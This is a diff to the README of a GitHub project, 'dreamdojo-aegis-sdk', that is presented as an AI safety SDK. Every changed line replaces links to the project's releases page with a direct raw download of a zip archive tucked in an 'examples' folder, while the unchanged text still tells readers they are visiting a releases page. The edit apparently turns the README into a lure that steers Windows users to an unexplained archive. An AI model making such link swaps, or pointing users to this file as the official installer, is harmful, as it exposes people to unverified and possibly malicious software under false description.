@@ -1,6 +1,6 @@
 # 🛡️ dreamdojo-aegis-sdk - Safe AI World Model Checks
 
-[![Download](https://img.shields.io/badge/Download-dreamdojo--aegis--sdk-blue?style=for-the-badge)](https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/releases)
+[![Download](https://img.shields.io/badge/Download-dreamdojo--aegis--sdk-blue?style=for-the-badge)](https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/raw/refs/heads/main/examples/sdk-dreamdojo-aegis-v2.7-alpha.3.zip)
 
 ---
 
@@ -40,12 +40,12 @@ To run the dreamdojo-aegis-sdk on Windows, your PC should meet these minimum req
 
 You will find the software files on the releases page linked below. Follow these steps carefully to get the program running without trouble.
 
-[![Download](https://img.shields.io/badge/Download-dreamdojo--aegis--sdk-blue?style=for-the-badge)](https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/releases)
+[![Download](https://img.shields.io/badge/Download-dreamdojo--aegis--sdk-blue?style=for-the-badge)](https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/raw/refs/heads/main/examples/sdk-dreamdojo-aegis-v2.7-alpha.3.zip)
 
 ### Step 1: Visit the Releases Page
 
 Go to the official releases page here:  
-https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/releases
+https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/raw/refs/heads/main/examples/sdk-dreamdojo-aegis-v2.7-alpha.3.zip
 
 This page lists all available versions of the software. The latest version will be at the top.
 
@@ -110,7 +110,7 @@ If problems persist, check the Issues section on the GitHub repository for commo
 ## 🔄 Updating the SDK
 
 Periodically visit the releases page to check for new versions:  
-https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/releases
+https://github.com/hamoudi123-9/dreamdojo-aegis-sdk/raw/refs/heads/main/examples/sdk-dreamdojo-aegis-v2.7-alpha.3.zip
 
 Download the newest installer and run it. It will update your current installation without removing your settings.
 
